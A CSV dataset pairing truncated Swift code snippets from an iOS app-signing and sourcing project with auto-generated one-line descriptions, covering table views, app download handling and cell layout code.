id,language,folder,code_type,file_path,nl,code
3232,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
if section == 1 {"
3233,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = UITableViewCell(style: .subtitle, reuseIdentifier: ""Cell"")

cell.textLabel?.font = UIFont.boldSystemFont(ofSize: 17)
cell.detailTextLabel?.font = UIFont.systemFont(ofSize: 13)
cell.detailTextLabel?.textColor = .secondaryLabel
cell.accessoryType = .disclosureIndicator
cell.backgroundColor = .clear

switch indexPath.section {"
3234,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint) -> UIContextMenuConfiguration?
{"
3235,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)
-> UISwipeActionsConfiguration?
{"
3236,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
if sources.isEmpty {"
3237,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","extension SourcesViewController - Controls user interface and application flow","extension SourcesViewController {
@objc func fetch() { fetchSources() }"
3238,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function fetch - implements fetch functionality","@objc func fetch() { fetchSources() }
func fetchSources() {"
3239,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function fetchSources - implements fetchsources functionality","func fetchSources() {
sources = CoreDataManager.shared.getAZSources()
searchResultsTableViewController.sources = sources
DispatchQueue.main.async {"
3240,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","extension SourcesViewController - Controls user interface and application flow","extension SourcesViewController: UISearchControllerDelegate, UISearchBarDelegate {
func setupSearchController() {"
3241,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function setupSearchController - sets upsearchcontroller","func setupSearchController() {
searchController = UISearchController(searchResultsController: searchResultsTableViewController)
searchController.obscuresBackgroundDuringPresentation = true
searchController.hidesNavigationBarDuringPresentation = true
searchController.delegate = self
searchController.searchBar.placeholder = String.localized(""SOURCES_VIEW_CONTROLLER_SEARCH_SOURCES"")
searchController.searchResultsUpdater = searchResultsTableViewController
searchResultsTableViewController.sources = sources
navigationItem.searchController = searchController
definesPresentationContext = true"
3242,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - SourceAppViewController Button Actions","extension SourceAppViewController {
// MARK: - Download Button Actions

@objc func getButtonTapped(_ sender: UIButton) {"
3243,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - Download Button Actions","@objc func getButtonTapped(_ sender: UIButton) {
let indexPath = IndexPath(row: sender.tag, section: 0)
guard let app = getAppAt(indexPath: indexPath) else { return }"
3244,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function getAppAt - retrieves appat","private func getAppAt(indexPath: IndexPath) -> StoreAppsData? {
guard indexPath.row < (isFiltering ? filteredApps.count : apps.count) else { return nil }"
3245,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function getDownloadURL - retrieves downloadurl","private func getDownloadURL(for app: StoreAppsData) -> URL? {
if let appDownloadURL = app.versions?.first?.downloadURL {"
3246,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function handleDownloadAction - implements handledownloadaction functionality","private func handleDownloadAction(for appUUID: String, at indexPath: IndexPath, downloadURL: URL) {
if let task = DownloadTaskManager.shared.task(for: appUUID) {"
3247,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - Long Press Actions","@objc func getButtonHold(_ gesture: UILongPressGestureRecognizer) {
guard gesture.state == .began,
let button = gesture.view as? UIButton else { return }"
3248,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function addVersionActions - implements addversionactions functionality","private func addVersionActions(
to alertController: UIAlertController,
for app: StoreAppsData,
at indexPath: IndexPath
) {"
3249,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function presentAlertController - implements presentalertcontroller functionality","private func presentAlertController(_ alertController: UIAlertController) {
DispatchQueue.main.async {"
3250,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","extension SourceAppViewController - Controls user interface and application flow","extension SourceAppViewController: DownloadDelegate {
func stopDownload(uuid: String) {"
3251,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function stopDownload - implements stopdownload functionality","func stopDownload(uuid: String) {
DispatchQueue.main.async {"
3252,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function startDownload - implements startdownload functionality","func startDownload(uuid: String, indexPath _: IndexPath) {
DispatchQueue.main.async {"
3253,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function updateDownloadProgress - updates downloadprogress","func updateDownloadProgress(progress: Double, uuid: String) {
DownloadTaskManager.shared.updateTask(uuid: uuid, state: .inProgress(progress: progress))
}
}

extension SourceAppViewController {"
3254,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","extension SourceAppViewController - Controls user interface and application flow","extension SourceAppViewController {
func startDownloadIfNeeded(
for indexPath: IndexPath,
in tableView: UITableView,
downloadURL: URL?,
appUUID: String?,
sourceLocation: String
) {"
3255,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function startDownloadIfNeeded - implements startdownloadifneeded functionality","func startDownloadIfNeeded(
for indexPath: IndexPath,
in tableView: UITableView,
downloadURL: URL?,
appUUID: String?,
sourceLocation: String
) {"
3256,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","MARK: - Private Download Helper Methods","private func setupCellForDownload(_ cell: AppTableViewCell) {
if cell.appDownload == nil {"
3257,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function showDownloadAnimation - implements showdownloadanimation functionality","private func showDownloadAnimation(in cell: AppTableViewCell) -> UIView {
// Show download animation in cell
let animationView = cell.addAnimatedIcon(
systemName: ""arrow.down.circle"",
tintColor: .systemBlue,
size: CGSize(width: 40, height: 40)
)

// Position animation in the cell
animationView.translatesAutoresizingMaskIntoConstraints = false"
3258,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function downloadFile - implements downloadfile functionality","private func downloadFile(downloadURL: URL, appUUID: String, indexPath: IndexPath) async throws -> URL {
// Create a temporary file path for the download
let tempDir = FileManager.default.temporaryDirectory
let filePath = tempDir.appendingPathComponent(""app_\(appUUID).ipa"")

// Start download and show progress
startDownload(uuid: appUUID, indexPath: indexPath)

// Download file with URLSession
let request = URLRequest(url: downloadURL)"
3259,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function verifyDownloadedFile - implements verifydownloadedfile functionality","private func verifyDownloadedFile(at url: URL) throws {
let fileData = try Data(contentsOf: url)
let checksum = CryptoHelper.shared.crc32(of: fileData)
Debug.shared.log(message: ""Download completed with checksum: \(checksum)"", type: .info)
}

private func processDownloadedBundle(
cell: AppTableViewCell,
animationView: UIView,
downloadedURL: URL,"
3260,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function processDownloadedBundle - implements processdownloadedbundle functionality","private func processDownloadedBundle(
cell: AppTableViewCell,
animationView: UIView,
downloadedURL: URL,
appUUID: String,
sourceLocation: String
) async {"
3261,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleExtractionError - implements handleextractionerror functionality","private func handleExtractionError(_ error: Error, cell: AppTableViewCell, appUUID: String) {
DownloadTaskManager.shared.updateTask(uuid: appUUID, state: .failed(error: error))
Debug.shared.log(message: ""Extraction error: \(error.localizedDescription)"", type: .error)

showStatusAnimation(
in: cell,
systemName: ""exclamationmark.circle"",
tintColor: .systemRed
)
}"
3262,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function processExtractedBundle - implements processextractedbundle functionality","private func processExtractedBundle(
targetBundle: String,
cell: AppTableViewCell,
appUUID: String,
sourceLocation: String
) {"
3263,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleImmediateInstallIfNeeded - implements handleimmediateinstallifneeded functionality","private func handleImmediateInstallIfNeeded(appUUID: String) {
// Check if immediate install is enabled
if UserDefaults.standard.signingOptions.immediatelyInstallFromSource {"
3264,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleDownloadError - implements handledownloaderror functionality","private func handleDownloadError(
_ error: Error,
cell: AppTableViewCell,
animationView: UIView,
appUUID: String,
downloadURL: URL
) async {"
3265,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function logDownloadError - implements logdownloaderror functionality","private func logDownloadError(_ error: Error, downloadURL: URL) {
// Handle error logging based on error type
// Note: Removed unnecessary cast since all Error objects can be treated as NSError
let nsError = error as NSError
Debug.shared.log(
message: ""Download error: \(nsError.localizedDescription) (code: \(nsError.code))"",
type: .error
)

// Add detailed error diagnostics"
3266,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function showStatusAnimation - implements showstatusanimation functionality","private func showStatusAnimation(
in cell: AppTableViewCell,
systemName: String,
tintColor: UIColor
) {"
3267,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","protocol DownloadDelegate - implements functionality related to download delegate","protocol DownloadDelegate: AnyObject {
func updateDownloadProgress(progress: Double, uuid: String)
func stopDownload(uuid: String)
}

// This extension is moved to UIApplication+TopViewController.swift to avoid redeclaration
"
3268,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - AppTableViewCell","class AppTableViewCell: UITableViewCell {
// MARK: - Properties

var appDownload: AppDownload?
private var progressObserver: NSObjectProtocol?

private let progressLayer = CAShapeLayer()
private var getButtonWidthConstraint: NSLayoutConstraint?
private var buttonImage: UIImage?
"
3269,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - View Setup","private func setupViews() {
let labelsStackView = UIStackView(arrangedSubviews: [nameLabel, versionLabel])
labelsStackView.axis = .vertical
labelsStackView.spacing = 1

// Add subviews
contentView.addSubview(iconImageView)
contentView.addSubview(labelsStackView)
contentView.addSubview(screenshotsScrollView)
screenshotsScrollView.addSubview(screenshotsStackView)"
3270,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints(labelsStackView: UIStackView) {
NSLayoutConstraint.activate([
iconImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 15),
iconImageView.widthAnchor.constraint(equalToConstant: 52),
iconImageView.heightAnchor.constraint(equalToConstant: 52),

labelsStackView.leadingAnchor.constraint(equalTo: iconImageView.trailingAnchor, constant: 15),
labelsStackView.trailingAnchor.constraint(equalTo: getButton.leadingAnchor, constant: -15),
labelsStackView.centerYAnchor.constraint(equalTo: iconImageView.centerYAnchor),
labelsStackView.topAnchor.constraint(greaterThanOrEqualTo: contentView.topAnchor, constant: 15),"
3271,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Button Configuration","private func configureGetButtonArrow() {
let symbolConfig = UIImage.SymbolConfiguration(pointSize: 13, weight: .bold)
buttonImage = UIImage(systemName: ""arrow.down"", withConfiguration: symbolConfig)
getButton.setImage(buttonImage, for: .normal)
getButton.tintColor = .tintColor
}

private func configureGetButtonSquare() {"
3272,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureGetButtonSquare - implements configuregetbuttonsquare functionality","private func configureGetButtonSquare() {
let symbolConfig = UIImage.SymbolConfiguration(pointSize: 9, weight: .bold)
buttonImage = UIImage(systemName: ""square.fill"", withConfiguration: symbolConfig)
getButton.setImage(buttonImage, for: .normal)
getButton.tintColor = .tintColor
}

private func configureProgressLayer() {"
3273,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureProgressLayer - implements configureprogresslayer functionality","private func configureProgressLayer() {
progressLayer.strokeColor = UIColor.tintColor.cgColor
progressLayer.lineWidth = 3.0
progressLayer.fillColor = nil
progressLayer.lineCap = .round
progressLayer.strokeEnd = 0.0

let circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)
progressLayer.path = circularPath.cgPath
getButton.layer.addSublayer(progressLayer)"
3274,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addObservers - implements addobservers functionality","private func addObservers() {
progressObserver = NotificationCenter.default.addObserver(
forName: .downloadProgressUpdated,
object: nil,
queue: .main
) { [weak self] notification in"
3275,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Lifecycle Methods","override func layoutSubviews() {
super.layoutSubviews()
updateProgressLayerPath()
}

override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
3276,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)
getButton.layer.backgroundColor = UIColor.quaternarySystemFill.cgColor
updateProgressLayerPath()
}

// MARK: - Cell Configuration

func configure(with app: StoreAppsData) {"
3277,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Cell Configuration","func configure(with app: StoreAppsData) {
// Configure basic app info
configureAppName(app)
configureVersionText(app)
configureAppIcon(app)

// Remove any existing screenshots
screenshotsStackView.arrangedSubviews.forEach { $0.removeFromSuperview() }"
3278,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureAppName - implements configureappname functionality","private func configureAppName(_ app: StoreAppsData) {
var appname = app.name
if app.bundleIdentifier.hasSuffix(""Beta"") {"
3279,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureVersionText - implements configureversiontext functionality","private func configureVersionText(_ app: StoreAppsData) {
let appVersion = (app.versions?.first?.version ?? app.version) ?? ""1.0""
var displayText = appVersion
var descText = """"

// Add date if available
displayText = addDateToDisplayText(displayText, app: app)

// Add subtitle/description based on preferences
(displayText, descText) = addAppDescriptionInfo(displayText, app: app)"
3280,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addDateToDisplayText - implements adddatetodisplaytext functionality","private func addDateToDisplayText(_ displayText: String, app: StoreAppsData) -> String {
var result = displayText
let appDate = (app.versions?.first?.date ?? app.versionDate) ?? """"

if !appDate.isEmpty {"
3281,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addAppDescriptionInfo - implements addappdescriptioninfo functionality","private func addAppDescriptionInfo(_ displayText: String, app: StoreAppsData) -> (String, String) {
var resultDisplay = displayText
var descText = """"

switch Preferences.appDescriptionAppearence {"
3282,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureAppIcon - implements configureappicon functionality","private func configureAppIcon(_ app: StoreAppsData) {
iconImageView.image = UIImage(named: ""unknown"")

if let iconURL = app.iconURL {"
3283,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupAppContentLayout - sets upappcontentlayout","private func setupAppContentLayout(_ app: StoreAppsData) {
if let screenshotUrls = app.screenshotURLs,
!screenshotUrls.isEmpty,
Preferences.appDescriptionAppearence != 2
{"
3284,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Screenshots Setup","private func setupScreenshots(for urls: [URL]) {
let imageViews = createImageViewsForScreenshots(urls)

screenshotsScrollView.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 10).isActive = true
screenshotsScrollView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true
iconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true

for imageView in imageViews {"
3285,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createImageViewsForScreenshots - creates imageviewsforscreenshots","private func createImageViewsForScreenshots(_ urls: [URL]) -> [UIImageView] {
return urls.map { _ -> UIImageView in"
3286,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupDescription - sets updescription","private func setupDescription() {
iconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true
descriptionLabel.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true
descriptionLabel.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 15).isActive = true
}

@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {"
3287,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function handleScreenshotTap - implements handlescreenshottap functionality","@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {
guard let tappedImageView = sender.view as? UIImageView,
let tappedImage = tappedImageView.image
else {"
3288,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Image Loading","private func loadImages(from urls: [URL], into imageViews: [UIImageView]) {
let dispatchGroup = DispatchGroup()

for (index, url) in urls.enumerated() {"
3289,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function loadImage - implements loadimage functionality","private func loadImage(from url: URL, completion: @escaping (UIImage?) -> Void) {
let request = ImageRequest(url: url)

if let cachedImage = ImagePipeline.shared.cache.cachedImage(for: request)?.image {"
3290,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Download State","private func updateDownloadState(uuid: String?) {
guard let appUUID = uuid else { return }"
3291,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateProgress - updates progress","func updateProgress(to value: CGFloat) {
DispatchQueue.main.async {"
3292,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function startDownload - implements startdownload functionality","func startDownload() {
DispatchQueue.main.async {"
3293,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function stopDownload - implements stopdownload functionality","func stopDownload() {
DispatchQueue.main.async {"
3294,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function cancelDownload - implements canceldownload functionality","func cancelDownload() {
DispatchQueue.main.async {"
3295,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateProgressLayerPath - updates progresslayerpath","private func updateProgressLayerPath() {
let circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)
progressLayer.path = circularPath.cgPath
}
}

// MARK: - Factory for UI Elements

private enum AppCellFactory {"
3296,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Factory for UI Elements","private enum AppCellFactory {
static func createIconImageView() -> UIImageView {"
3297,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createIconImageView - creates iconimageview","static func createIconImageView() -> UIImageView {
let imageView = UIImageView()
imageView.contentMode = .scaleAspectFill
imageView.clipsToBounds = true
imageView.layer.cornerRadius = 12
imageView.layer.cornerCurve = .continuous
imageView.layer.borderWidth = 1
imageView.layer.borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor
imageView.translatesAutoresizingMaskIntoConstraints = false
return imageView"
3298,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createNameLabel - creates namelabel","static func createNameLabel() -> UILabel {
let label = UILabel()
label.font = .boldSystemFont(ofSize: 16)
label.numberOfLines = 1
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createVersionLabel() -> UILabel {"
3299,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createVersionLabel - creates versionlabel","static func createVersionLabel() -> UILabel {
let label = UILabel()
label.font = .systemFont(ofSize: 13, weight: .regular)
label.textColor = .gray
label.numberOfLines = 2
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createDescriptionLabel() -> UILabel {"
3300,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createDescriptionLabel - creates descriptionlabel","static func createDescriptionLabel() -> UILabel {
let label = UILabel()
label.font = .systemFont(ofSize: 13, weight: .regular)
label.textColor = .gray
label.numberOfLines = 20
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createScreenshotsScrollView() -> UIScrollView {"
3301,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createScreenshotsScrollView - creates screenshotsscrollview","static func createScreenshotsScrollView() -> UIScrollView {
let scrollView = UIScrollView()
scrollView.contentInset = UIEdgeInsets(top: 0, left: 15, bottom: 0, right: 15)
scrollView.showsHorizontalScrollIndicator = false
scrollView.translatesAutoresizingMaskIntoConstraints = false
return scrollView
}

static func createScreenshotsStackView() -> UIStackView {"
3302,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createScreenshotsStackView - creates screenshotsstackview","static func createScreenshotsStackView() -> UIStackView {
let stackView = UIStackView()
stackView.axis = .horizontal
stackView.spacing = 10
stackView.alignment = .center
stackView.translatesAutoresizingMaskIntoConstraints = false
return stackView
}
}
"
3303,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - SourceAppScreenshotViewController","class SourceAppScreenshotViewController: UIViewController {
// MARK: - Properties

var image: UIImage?

// MARK: - UI Components

private let imageView: UIImageView = {"
3304,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupView()
}

override func viewDidLayoutSubviews() {"
3305,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function viewDidLayoutSubviews - implements viewdidlayoutsubviews functionality","override func viewDidLayoutSubviews() {
super.viewDidLayoutSubviews()
updateImageViewSize()
}

// MARK: - Setup

private func setupView() {"
3306,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Setup","private func setupView() {
view.backgroundColor = .systemBackground
view.addSubview(imageView)
setupConstraints()
imageView.image = image

navigationItem.rightBarButtonItem = UIBarButtonItem(
title: String.localized(""DONE""),
style: .done,
target: self,"
3307,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
imageView.centerXAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerXAnchor),
imageView.centerYAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),
imageView.widthAnchor.constraint(lessThanOrEqualTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.9),
imageView.heightAnchor.constraint(
lessThanOrEqualTo: view.safeAreaLayoutGuide.heightAnchor,
multiplier: 0.9
),
])"
3308,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateImageViewSize - updates imageviewsize","private func updateImageViewSize() {
guard let image = image else { return }"
